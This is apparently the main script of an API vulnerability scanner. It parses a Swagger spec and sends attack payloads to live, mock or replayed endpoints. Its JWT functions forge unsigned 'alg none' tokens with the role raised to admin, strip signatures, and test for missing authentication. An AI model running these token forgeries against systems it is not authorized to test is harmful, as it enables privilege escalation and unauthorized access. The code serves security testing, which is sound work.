import asyncio
import os
import json
import argparse
import base64
from copy import deepcopy
import jwt

from colorama import Fore, Style
from report_generator import generate_html_report
from parser.parser_factory import ParserFactory
from core.Severity_engine import SeverityEngine

from attacks.attack_generator import AttackGenerator
from attacks.auth_attacks import AuthAttackGenerator
from attacks.async_executor import (
    RealHTTPExecutor,
    MockExecutor,
    ReplayExecutor,
    BaseExecutor,
)

from analyser.response_analyser import ResponseAnalyzer
from analyser.endpoints_risk_scoring_engine import EndpointRiskScorer

from core.semantic_diff_engine import SemanticDiffEngine
from core.payload_strategy import PayloadStrategy
from core.scan_memory import ScanMemory
from core.execution_engine import ExecutionEngine
from core.intelligence_core import IntelligenceCore
from core.scan_pahse_engine import ScanPhaseEngine
from core.auth_Strategy_engine import AuthStrategyEngine


# ================= JWT TESTING CORE =================

def decode_jwt(token):
    try:
        return jwt.decode(token, options={"verify_signature": False})
    except:
        return None


def encode_none(payload):
    header = {"alg": "none", "typ": "JWT"}

    def b64(data):
        return base64.urlsafe_b64encode(json.dumps(data).encode()).rstrip(b"=").decode()

    return f"{b64(header)}.{b64(payload)}."


def tamper_role(payload):
    p = deepcopy(payload)
    p["role"] = "admin"
    return p


def remove_signature(token):
    parts = token.split(".")
    if len(parts) == 3:
        return parts[0] + "." + parts[1] + "."
    return token


# ===================================================


def create_executor(mode, base_url=None, replay_file=None) -> BaseExecutor:

    if mode == "live":
        if not base_url:
            raise ValueError("Live mode requires a base_url.")
        return RealHTTPExecutor(base_url, max_concurrency=20, timeout=10)

    if mode == "mock":
        return MockExecutor()

    if mode == "replay":
        if not replay_file or not os.path.exists(replay_file):
            raise ValueError("Replay file not found.")
        with open(replay_file, "r") as f:
            recorded = json.load(f)
        return ReplayExecutor(recorded)

    raise ValueError("Invalid execution mode.")


async def run_scan_async(
    swagger_path,
    base_url=None,
    mode="live",
    replay_file=None,
):

    parser = ParserFactory.create_parser(swagger_path, base_url)

    target = base_url or os.getenv("AAVS_TARGET")

    if not target and hasattr(parser, "get_base_url"):
        target = parser.get_base_url()

    if mode == "live" and not target:
        raise ValueError("No base URL found for target API.")

    executor = create_executor(mode, target, replay_file)

    attacker = AttackGenerator()
    analyzer = ResponseAnalyzer()
    semantic_engine = SemanticDiffEngine()
    risk_scorer = EndpointRiskScorer()
    payload_strategy = PayloadStrategy()
    memory = ScanMemory()
    severity_engine = SeverityEngine()

    execution_engine = ExecutionEngine(executor, memory)

    intelligence = IntelligenceCore(
        semantic_engine,
        analyzer,
        memory
    )

    phase_engine = ScanPhaseEngine(memory)

    endpoints = parser.get_all_endpoints()
    ranked_endpoints = risk_scorer.rank_endpoints(endpoints)

    findings = []
    jwt_token = None

    for endpoint in ranked_endpoints:

        path = endpoint["path"]
        method = endpoint["method"]

        print(f"\n{Fore.CYAN}→ Scanning {method} {path}{Style.RESET_ALL}")

        baseline = await execution_engine.get_baseline(endpoint)

        details = parser.get_endpoint_details(path, method)
        base_payloads = attacker.generate_for_endpoint(details)

        selected_payloads = payload_strategy.generate(
            path,
            str(details.get("parameters", "")),
            base_payloads,
        )

        for payload in selected_payloads[:5]:

            try:
                result = await execution_engine.execute(endpoint, payload)

                if not result:
                    continue

                # Extract JWT from login
                if "/login" in path and isinstance(result, dict):
                    jwt_token = result.get("token")

                # ================= JWT TESTING =================

                if jwt_token:

                    decoded = decode_jwt(jwt_token)

                    if decoded:

                        # 1. Role Tampering
                        tampered = tamper_role(decoded)
                        forged = encode_none(tampered)

                        res = await execution_engine.execute(endpoint, {
                            "__headers__": {"Authorization": forged}
                        })

                        if res and str(res) != str(baseline):
                            findings.append({
                                "endpoint": path,
                                "method": method,
                                "reason": "JWT Role Tampering",
                                "severity": "CRITICAL"
                            })

                        # 2. No Signature
                        no_sig = remove_signature(jwt_token)

                        res = await execution_engine.execute(endpoint, {
                            "__headers__": {"Authorization": no_sig}
                        })

                        if res and "200" in str(res):
                            findings.append({
                                "endpoint": path,
                                "method": method,
                                "reason": "JWT No Signature Accepted",
                                "severity": "CRITICAL"
                            })

                        # 3. No Token
                        res = await execution_engine.execute(endpoint, {})

                        if res and "200" in str(res):
                            findings.append({
                                "endpoint": path,
                                "method": method,
                                "reason": "No Authentication Required",
                                "severity": "HIGH"
                            })

                # =================================================

                response_text = str(result).lower()

                if "root" in response_text:
                    findings.append({
                        "endpoint": path,
                        "method": method,
                        "reason": "Command Injection",
                        "severity": "CRITICAL"
                    })

                intelligence.process(endpoint, payload, baseline, result)

            except Exception as e:
                print(f"{Fore.RED}Execution error on {path}: {str(e)}{Style.RESET_ALL}")

    print(f"\n{Fore.GREEN}✓ Completed scanning {len(ranked_endpoints)} endpoints{Style.RESET_ALL}\n")

    analyzer.print_summary()

    print("\n========== MANUAL FINDINGS ==========")
    for f in findings:
        print(json.dumps(f, indent=2))

    severity_engine.print_ranking()

    return findings


def run_scan(
    swagger_path,
    base_url=None,
    mode="live",
    replay_file=None,
):

    return asyncio.run(
        run_scan_async(
            swagger_path,
            base_url,
            mode,
            replay_file,
        )
    )


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="AAVS API Vulnerability Scanner")

    parser.add_argument("--spec", required=True)
    parser.add_argument("--base_url", default="http://localhost:3000")
    parser.add_argument("--mode", default="live", choices=["live", "mock", "replay"])
    parser.add_argument("--replay_file", default=None)

    args = parser.parse_args()

    swagger_file = os.path.abspath(args.spec)

    if not os.path.exists(swagger_file):
        raise FileNotFoundError(f"Spec file not found: {swagger_file}")

    findings = run_scan(
        swagger_file,
        base_url=args.base_url,
        mode=args.mode,
        replay_file=args.replay_file,
    )

    for f in findings:
        print(json.dumps(f, indent=2))

    generate_html_report(findings)